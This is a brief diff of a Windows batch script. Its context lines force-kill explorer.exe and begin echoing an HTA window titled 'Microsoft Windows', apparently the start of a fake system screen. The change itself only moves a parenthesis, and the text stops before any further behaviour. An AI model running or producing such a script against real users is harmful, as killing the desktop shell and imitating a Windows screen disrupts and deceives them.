@@ -1,8 +1,8 @@
 @echo off
 
-(
 taskkill /f /im explorer.exe
 cls
+(
 echo ^<html^>^<head^>^<title^>Microsoft Windows^</title^> 
 echo. 
 echo ^<hta:application id="oBVC" 
